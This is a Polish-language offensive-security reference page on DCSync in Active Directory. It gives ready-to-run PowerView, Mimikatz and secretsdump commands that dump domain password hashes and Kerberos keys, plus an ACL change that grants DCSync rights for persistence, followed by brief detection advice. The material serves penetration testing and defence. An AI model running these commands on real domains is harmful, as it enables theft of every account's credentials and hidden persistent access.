# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie tych uprawnień nad samym domeną: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.

**Ważne uwagi dotyczące DCSync:**

- **Atak DCSync symuluje zachowanie kontrolera domeny i prosi inne kontrolery domeny o replikację informacji** za pomocą protokołu zdalnej replikacji katalogów (MS-DRSR). Ponieważ MS-DRSR jest ważną i niezbędną funkcją Active Directory, nie można go wyłączyć ani dezaktywować.
- Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** mają wymagane uprawnienia.
- Jeśli jakiekolwiek hasła kont są przechowywane z odwracalnym szyfrowaniem, w Mimikatz dostępna jest opcja zwrócenia hasła w postaci czystego tekstu.

### Enumeration

Sprawdź, kto ma te uprawnienia, używając `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Eksploatacja lokalna
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatacja Zdalna
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami w postaci czystego tekstu z NTDS dla wszystkich kont ustawionych z włączonym [**szyfrowaniem odwracalnym**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Możesz uzyskać użytkowników z szyfrowaniem odwracalnym za pomocą

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Utrzymywanie dostępu

Jeśli jesteś administratorem domeny, możesz przyznać te uprawnienia dowolnemu użytkownikowi za pomocą `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Następnie możesz **sprawdzić, czy użytkownik został poprawnie przypisany** 3 uprawnieniom, szukając ich w wynikach (powinieneś być w stanie zobaczyć nazwy uprawnień w polu "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Polityka audytu dla obiektu musi być włączona) – Operacja została wykonana na obiekcie
- Security Event ID 5136 (Polityka audytu dla obiektu musi być włączona) – Obiekt usługi katalogowej został zmodyfikowany
- Security Event ID 4670 (Polityka audytu dla obiektu musi być włączona) – Uprawnienia do obiektu zostały zmienione
- AD ACL Scanner - Twórz i porównuj raporty ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
